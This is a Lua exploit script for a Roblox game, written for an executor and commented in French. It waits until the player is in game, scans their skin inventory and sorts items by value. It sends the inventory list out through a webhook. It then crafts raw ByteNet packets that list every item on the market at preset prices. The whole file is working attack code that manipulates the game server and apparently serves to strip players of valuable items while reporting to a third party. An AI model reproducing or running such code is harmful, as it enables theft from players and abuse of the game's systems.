task.spawn(function()
    task.wait(0.5)

    local function httpPost(url, body, headers)
        headers = headers or { ["Content-Type"] = "application/json" }
        local requestFunc = (syn and syn.request) or (http and http.request) or request
        if requestFunc then
            local ok, res = pcall(function()
                return requestFunc({ Url=url, Method="POST", Headers=headers, Body=body })
            end)
            if ok and res and res.StatusCode == 200 then return res.Body end
        end
        local ok, bodyRes = pcall(function()
            return game:HttpGet(url, true, headers, body)
        end)
        if ok and bodyRes and bodyRes ~= "" then return bodyRes end
        return nil
    end

    local function getPresenceStatus(userId)
        local payload = Http:JSONEncode({ userIds = { userId } })
        local headers = { ["Content-Type"] = "application/json" }
        local body = httpPost("https://presence.roblox.com/v1/presence/users", payload, headers)
        if not body then
            body = httpPost("https://presence.roproxy.com/v1/presence/users", payload, headers)
        end
        if not body then return nil, "no_response" end
        local ok, data = pcall(function() return Http:JSONDecode(body) end)
        if not ok or type(data) ~= "table" or not data.userPresences or not data.userPresences[1] then
            return nil, "invalid_body"
        end
        return data.userPresences[1].userPresenceType, nil
    end

    local function waitUntilInGame()
        if not CHECK_PRESENCE then
            STATE.presenceChecked = true
            STATE.inGame = true
            return
        end

        local uid = CHECK_USER_ID or P.UserId
        local label = { [0]="Hors ligne", [1]="Sur le site", [2]="En jeu", [3]="Studio" }
        print(("[Presence] Vérification compte %d (poll=%ds)..."):format(uid, PRESENCE_POLL))

        local failCount = 0
        local waitTime  = PRESENCE_POLL

        while true do
            checkAlive()
            local st, err = getPresenceStatus(uid)
            STATE.presenceStatus = st
            STATE.presenceError  = err
            STATE.presenceChecked = true

            if st == nil then
                failCount = failCount + 1
                waitTime  = math.min(waitTime * 2, 60)
                warn(("[Presence] Échec %d/%d (%s) → retry dans %ds"):format(
                    failCount, PRESENCE_MAX_FAIL, tostring(err), waitTime))
                if failCount >= PRESENCE_MAX_FAIL then
                    warn("[Presence] Trop d'échecs → on continue quand même.")
                    STATE.inGame = true
                    return
                end
                waitAlive(waitTime)

            elseif st == 2 then
                STATE.inGame = true
                if not STATE.webhookStartingSent then
                    STATE.webhookStartingSent = true
                    sendWebhook(("✅ **%s**\n> Detected in game — starting sale in **%ds**"):format(
                        P.Name, PRESENCE_WAIT))
                end
                print(("[Presence] ✅ En jeu ! Attente de %ds avant vente..."):format(PRESENCE_WAIT))
                waitAlive(PRESENCE_WAIT)
                return

            else
                if not STATE.webhookNotInGameSent then
                    STATE.webhookNotInGameSent = true
                    sendWebhook(("❌ **%s**\n> Not in game (status: **%s**)\n> Cannot start — please rejoin the game"):format(
                        P.Name, label[st] or "?"))
                end
                print(("[Presence] Statut : %s — recheck dans %ds"):format(label[st] or "?", PRESENCE_POLL))
                failCount = 0
                waitTime  = PRESENCE_POLL
                waitAlive(PRESENCE_POLL)
            end
        end
    end

    local SkinData
    do
        local ok, mod = pcall(function() return require(RS.Modules:WaitForChild("SkinData")) end)
        if ok and type(mod) == "table" then SkinData = mod
        else warn("[SkinData] require échoué"); SkinData = {} end
    end

    local SIDS = RS.Modules:WaitForChild("SkinIDS")
    local ok, raw = pcall(require, SIDS)
    if not ok or type(raw) ~= "table" then warn("require(SkinIDS)", raw); return end
    local nameToId = {}
    for k,v in pairs(raw) do
        if type(k)=="number" and type(v)=="string" then nameToId[v]=k
        elseif type(k)=="string" and type(v)=="number" and not nameToId[k] then nameToId[k]=v end
    end

    local function norm(s) return (tostring(s):gsub("^%s+",""):gsub("%s+$",""):gsub("%s+"," ")) end
    local function findId(n)
        if not n then return end
        if nameToId[n] then return nameToId[n] end
        local x = norm(n); if nameToId[x] then return nameToId[x] end
        local lo = x:lower()
        for k,id in pairs(nameToId) do if k:lower()==lo then return id end end
    end
    local function parseQty(t)
        if not t then return end
        local d = tostring(t):match("%d+"); return d and tonumber(d)
    end
    local function u16(n) n=math.floor(n)%65536; return {n%256, math.floor(n/256)%256} end
    local function u32(n)
        n = math.floor(n) % 4294967296
        return { n%256, math.floor(n/256)%256, math.floor(n/65536)%256, math.floor(n/16777216)%256 }
    end

    local function hasAnimations(name)
        local d = SkinData[name]
        if type(d) ~= "table" then return false end
        return d.specialFunc ~= nil or d.equipped ~= nil or d.killEffectFunc ~= nil
    end

    local function classify(name)
        local d = SkinData[name]
        local cost = (d and type(d) == "table") and tonumber(d.cost) or nil
        if PRIORITY[name] then return 0, cost or 0, cost ~= nil end
        if hasAnimations(name) then return 1, cost or 0, cost ~= nil end
        if cost and cost >= PRICE_THRESHOLD then return 2, cost, true end
        return 3, DEFAULT_NO_COST_PRICE, false
    end

    waitUntilInGame()

    -- ============================================================
    -- 🔍 SCAN AVEC LECTURE ROBUSTE DE .Quantity (enfant direct)
    -- ============================================================
    local List = P.PlayerGui.CrateUI.Crates.CrateMenu.Container.Inventory.List
    local Event = RS:WaitForChild("ByteNetReliable")
    local cands, lines = {}, {}
    local animCount = 0

    -- Lecture type-agnostique de la quantité
    local function readQuantity(v)
        local q = v:FindFirstChild("Quantity")   -- enfant DIRECT uniquement
        if not q then return nil end
        if q:IsA("TextLabel") or q:IsA("TextButton") or q:IsA("TextBox") then
            return parseQty(q.Text)
        elseif q:IsA("NumberValue") or q:IsA("IntValue") then
            return tonumber(q.Value)
        elseif q:IsA("StringValue") then
            return parseQty(q.Value)
        end
        return nil
    end

    -- Traitement d'un bouton
    local function processButton(v)
        if not (v:IsA("TextButton") or v:IsA("ImageButton")) then return end
        local n = readQuantity(v)
        local id = findId(v.Name)
        if n and n >= 1 then
            local group, costForDisplay, hasCost = classify(v.Name)
            local tag = (group==0) and "[P] " or (group==1) and "[A] " or (group==3) and "[NC] " or ""
            table.insert(lines, tag..v.Name.." x"..n.." (cost:"..(hasCost and tostring(costForDisplay) or "n/a")..")")
            if group == 1 then animCount = animCount + 1 end
            if id then
                table.insert(cands, { name=v.Name, id=id, quantity=n, group=group, cost=costForDisplay, hasCost=hasCost })
            else
                table.insert(lines, "  [!] "..v.Name.." - ID introuvable")
            end
        else
            -- Log si un bouton a pas de quantité lisible
            local q = v:FindFirstChild("Quantity")
            if q then
                table.insert(lines, "[?] "..v.Name.." qty="..q.ClassName)
            end
        end
    end

    -- Parcours récursif de List (gère les dossiers/frames intermédiaires)
    local function walk(node)
        for _, child in ipairs(node:GetChildren()) do
            if child:IsA("TextButton") or child:IsA("ImageButton") then
                processButton(child)
            elseif child:IsA("Folder") or child:IsA("Frame") or child:IsA("ScrollingFrame") then
                walk(child)
            end
        end
    end

    walk(List)

    table.sort(cands, function(a, b)
        if a.group ~= b.group then return a.group < b.group end
        if a.group == 0 then return PRIORITY[a.name] < PRIORITY[b.name] end
        if a.group == 1 then
            if a.hasCost ~= b.hasCost then return a.hasCost end
            if a.cost ~= b.cost then return a.cost > b.cost end
            return a.name < b.name
        end
        if a.group == 2 then
            if a.cost ~= b.cost then return a.cost > b.cost end
            return a.name < b.name
        end
        return a.name < b.name
    end)

    print(("[Scan] %d vendable(s) — %d animé(s)"):format(#cands, animCount))

    if #lines > 0 then
        local head = "```"..P.Name.."```\n──────────\n-# "
        local limit = 1900 - #head
        local msg = table.concat(lines, " | ")
        local chunks = {}
        while #msg > limit do
            local cut = msg:sub(1, limit)
            local pos = cut:match(".*() | ") or limit
            table.insert(chunks, msg:sub(1, pos-1))
            msg = msg:sub(pos+3)
        end
        if #msg > 0 then table.insert(chunks, msg) end
        for i,s in ipairs(chunks) do
            checkAlive()
            local content = (i==1 and head or "-# ")..s
            sendWebhook(content)
        end
    end

    if #cands == 0 then
        warn("Aucun item vendable.")
        sendWebhook(("⚠️ **%s**\n> No sellable items found in inventory"):format(P.Name))
        return
    end

    local function resolveMarketPrice(name)
        local p = (type(priceMarket)=="table")
            and (priceMarket[name] or priceMarket.__default or 1000)
            or priceMarket
        p = math.floor(tonumber(p) or 1000)
        if p < 1 then p = 1 end
        return p
    end

    local sent, failed = 0, 0
    for i,item in ipairs(cands) do
        checkAlive()
        local qty = MAX_STACK and math.min(MAX_STACK, item.quantity) or item.quantity
        local finalPrice = resolveMarketPrice(item.name)
        local tag = (item.group==0) and " [PRIORITÉ]" or (item.group==1) and " [ANIM]" or (item.group==3) and " [NO PRICE]" or ""

        print(("\n───── [%d/%d] %s ─────"):format(i, #cands, item.name))
        print(("  id=%d | qty=%d | prix=%d%s"):format(item.id, qty, finalPrice, tag))

        waitAlive(DELAY)
        checkAlive()

        local b = {0, 219, 4}
        table.move(u16(item.id), 1, 2, #b+1, b)
        table.insert(b, LISTING_TYPE)
        table.move(u32(finalPrice), 1, 4, #b+1, b)
        table.move(u32(qty),        1, 4, #b+1, b)

        local hex = {}
        for _, v in ipairs(b) do table.insert(hex, string.format("%02X", v)) end
        print(("  HEX = %s"):format(table.concat(hex, " ")))

        local buf = buffer.create(#b)
        for j = 1, #b do buffer.writeu8(buf, j-1, b[j]) end

        local okF, errF = pcall(function() Event:FireServer(buf, nil) end)
        if okF then
            sent = sent + 1
            print("  ✅ envoyé")
        else
            failed = failed + 1
            warn("  ❌ échec: "..tostring(errF))
        end
    end

    print(("\n═══════════ RÉSULTAT ═══════════"))
    print(("Envoyés: %d | Échecs: %d"):format(sent, failed))

    if not STATE.webhookFinishSent then
        STATE.webhookFinishSent = true
        sendWebhook(("🏁 **%s**\n> Sale finished\n> ✅ Sent: **%d** | ❌ Failed: **%d**"):format(
            P.Name, sent, failed))
    end
end)

